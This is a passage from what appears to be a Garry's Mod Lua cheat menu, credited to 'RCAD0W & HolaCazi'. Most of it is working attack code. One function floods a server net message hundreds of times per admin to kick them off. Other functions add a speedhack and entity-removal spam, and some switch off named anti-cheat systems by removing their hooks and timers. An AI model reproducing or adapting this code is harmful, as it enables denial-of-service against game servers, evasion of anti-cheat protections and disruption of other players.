		timer.Create("sce_spamremovegmod", 0.5, 0, function()
			RunConsoleCommand("sce_removegmod")
		end)
		spamremovegmod = true
	end
end)

local spamremove = false
AAAAAAAA.Add("sce_spamremove", function(pl)
	if spamremove then
		hook.Remove("OnEntityCreated", "lolaids")
		spamremove = false
	else
		hook.Add("OnEntityCreated", "lolaids", function( ent )
			RunConsoleCommand("sce_remove")
		end)
		spamremove = true
	end
end)

local spamremovelp = false
AAAAAAAA.Add("sce_spamremoveLP", function(pl)
	if spamremovelp then
		hook.Remove("OnEntityCreated", "lolaidslp")
		spamremovelp = false
	else
		hook.Add("OnEntityCreated", "lolaidslp", function( ent )
			if LocalPlayer():GetEyeTrace().Entity == ent then ent.ImOwner = true end
			RunConsoleCommand("sce_remove")
		end)
		spamremovelp = true
	end
end)



AAAAAAAA.Add("sce_tac_check", function(pl)
	if RunCheck then
		print("LOL yeah")
	else
		print("nope. gah!!")
	end
end)

AAAAAAAA.Add("sce_tac_remove", function(pl)
	if RunCheck then
		function RunCheck()
			pl:ChatPrint("You would have been kicked. Your welcome.")
		end
		pl:ChatPrint("Tyler's Anti Cheat. The shitty one. Has been patched. LOL!!!")
	end
end)

AAAAAAAA.Add("gethooks", function()
	PrintTable(hook.GetTable())
end)


--minimap--
Extra:AddOption( "Minimap", function()
LocalPlayer():EmitSound("npc/metropolice/vo/11-99officerneedsassistance.wav",500,100)
local MapData  = {}
MapData.x = 25
MapData.y = 30
MapData.w = 210
MapData.h = 105

/**************************
 Function: CROSSHAIR
**************************/
function crosshair()
	surface.SetDrawColor( 255, 255, 0, 255)
	surface.DrawRect(ScrW()/2-4 , ScrH()/2-3, 5, 5 )
end
hook.Add('HUDPaint', 'crosshair', crosshair)

/**************************
 Function: GAME HUD HEALTHBAR
**************************/
function healthbar()
	--		  --
	-- Health --
	--		  --
	surface.SetDrawColor( 0, 0, 0, 175)
	surface.DrawRect(15+10 , ScrH()-30, 230/2-13, 12 )
	-- ^ Background
	surface.SetDrawColor( 255, 0, 0, 200)
	if LocalPlayer():Health() < 100 then
	surface.DrawRect(15+10 , 145, LocalPlayer():Health()*2.3/2-13, 12 )
	else
	surface.DrawRect(15+10 , 145, 230/2-13, 12 )
	end
	--		 --
	-- Armor --
	--		 --
	surface.SetDrawColor( 0, 0, 0, 175)
	surface.DrawRect(130+3 , ScrH()-30, 230/2-13, 12 )
	-- ^ Background
	surface.SetDrawColor( 0, 100, 255, 200)
	if LocalPlayer():Armor() < 100 then
	surface.DrawRect(130+3 , 145, LocalPlayer():Armor()*2.3/2-13, 12 )
	else
	surface.DrawRect(130+3 , 145, 230/2-13, 12 )
	end
end
hook.Add('HUDPaint', 'healthbar', healthbar)

/**************************
 Function: GAME HUD
**************************/
function MinimapLoop()
	--			  --
	-- Background --
	--			  --
	surface.SetDrawColor( 50, 50, 50, 255)
	surface.DrawRect(15 , 145, 230, 20 )
	surface.DrawRect(15 , 20, 230, 125 )
	--			  --
	--   MiniMap  --
	--			  --
	MapData.angles = Angle(70, LocalPlayer():EyeAngles().yaw, 0)
	MapData.origin = LocalPlayer():GetPos() + Vector(0 ,0, 500)
	render.RenderView(MapData)
end
hook.Add('HUDPaint', 'MinimapLoop', MinimapLoop) xMsg( "Minimap added to remove rejoin.") end )

--more variables--

uRequest= 1; //Default Request Counter.
function Fukdeadmins()
xMsg("DestroyIn De Admins..")
timer.Create( "303error", 3, 0, function()
for k,v in ipairs(player.GetAll()) do 
if( v:GetUserGroup() != "user" ) then
  if v:Nick() != "Unlimited" then
for i=0, 700 do 
net.Start( "GetCar" ) 
net.WriteEntity(v) 
net.WriteEntity(v) 
net.SendToServer() 
end
xMsg("Flooding Client: " ..v:Nick())
end
end
end 
end)
end
concommand.Add( "RAE_kickadmins", Fukdeadmins)

concommand.Add("+Rae_speedhack", speedhack_on)
concommand.Add("-Rae_speedhack", speedhack_off)

//////////////////////////
// SpeedHack Functions //
////////////////////////
function speedhack_on(  ) 
Rae:ConCommand("+speed;_host_framerate 8;host_framerate 8")

xMsg("Enabled SpeedHack")
end
function speedhack_off(  ) 
Rae:ConCommand("-speed;_host_framerate 0;host_framerate 0")

xMsg("Disabled SpeedHack")
end

////////////////////////////
// Fuck Off Lua Stealers //
//////////////////////////
function file.Read(d)
   return "Failed to Steal my file."
end

///////////////////
// QAC Bypasser //
/////////////////
timer.Destroy( "STC" )
hook.Remove("PlayerInitialSpawn", "AddPlayer")
hook.Remove("OnGamemodeLoaded", "___scan_g_init")
hook.Remove("PlayerSay", "screengrab_playersay")


local Speed = menu:AddSubMenu( "Speedhack" )
Speed:AddOption( "SpeedHack On", function()
LocalPlayer():EmitSound("vo/canals/arrest_run.wav",500,100)
Rae:ConCommand("+Rae_speedhack")
end):SetImage( "icon16/lightning_go.png" )


Speed:AddOption( "SpeedHack Off", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
Rae:ConCommand("-Rae_speedhack")
end):SetImage( "icon16/lightning_delete.png" )


///////////////////
// AntiPK Extra //
/////////////////
concommand.Add("RAZORV_bypasspk", function()
net.Recieve("sMsgStandard", function()
CPrint("Bypassed")
end)
net.Receive("sNotifyHit", function()
CPrint("Bypassed")
end)
net.Receive("sMsgAdmins", function()
CPrint("Bypassed")
end)
net.Receive("sAlertNotice", function()
CPrint("Bypassed")
end)
end)





/////////////////
// Water Mark //
///////////////
hook.Add("HUDPaint", "Feedermen", function()
draw.DrawText("Current _R_C_A_D_0_W__ Version: " .. _R_C_A_D_0_W_ .. "", "BudgetLabel", 30, 30, Color(50, 150, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
draw.DrawText("Made by: RCAD0W & HolaCazi ", "BudgetLabel", 30, 45, Color(50, 150, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
end)



	menu:AddOption( "Close", function() LocalPlayer():EmitSound("vo/canals/male01/gunboat_farewell.wav",500,100) xMsg( "Menu closed.") end ) -- The menu will remove itself, we don't have to do anything.

end )